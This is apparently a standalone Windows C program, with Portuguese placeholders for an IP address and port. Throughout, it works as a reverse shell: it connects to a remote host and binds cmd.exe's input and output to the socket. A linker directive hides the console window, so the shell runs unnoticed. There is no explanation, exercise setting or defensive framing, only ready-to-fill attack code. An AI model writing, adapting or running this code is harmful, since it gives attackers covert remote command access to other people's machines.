#include <windows.h>

#include <winsock2.h>

#include <ws2tcpip.h>

#include <stdio.h>

#include <stdlib.h>



#pragma comment(lib,"ws2_32")

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")



int main()

{

    WSADATA wsaData;

    SOCKET Winsock = INVALID_SOCKET;

    struct sockaddr_in hax;

    char ip_addr[16] = "(seu_ip)";

    char port[6] = "(sua_porta)";

    STARTUPINFO ini_processo = { 0 };

    PROCESS_INFORMATION processo_info = { 0 };

    int result;



    // Initialize Winsock

    result = WSAStartup(MAKEWORD(2, 2), &wsaData);

    if (result != 0) {

        printf("WSAStartup failed: %d\n", result);

        return 1;

    }



    // Create socket

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if (Winsock == INVALID_SOCKET) {

        printf("Socket creation failed: %d\n", WSAGetLastError());

        WSACleanup();

        return 1;

    }



    // Resolve hostname

    struct hostent *host;

    host = gethostbyname(ip_addr);

    if (host == NULL) {

        printf("Host resolution failed: %d\n", WSAGetLastError());

        closesocket(Winsock);

        WSACleanup();

        return 1;

    }



    // Setup connection details

    memset(&hax, 0, sizeof(hax));

    hax.sin_family = AF_INET;

    hax.sin_port = htons(atoi(port));

    hax.sin_addr.s_addr = inet_addr(ip_addr);



    // Connect to remote host

    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {

        printf("Connection failed: %d\n", WSAGetLastError());

        closesocket(Winsock);

        WSACleanup();

        return 1;

    }



    // Setup process info

    ini_processo.cb = sizeof(ini_processo);

    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;



    // Create process

    TCHAR cmd[255] = TEXT("cmd.exe");

    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info)) {

        printf("Process creation failed: %d\n", GetLastError());

        closesocket(Winsock);

        WSACleanup();

        return 1;

    }



    // Wait for process to complete

    WaitForSingleObject(processo_info.hProcess, INFINITE);



    // Cleanup

    CloseHandle(processo_info.hProcess);

    CloseHandle(processo_info.hThread);

    closesocket(Winsock);

    WSACleanup();



    return 0;

}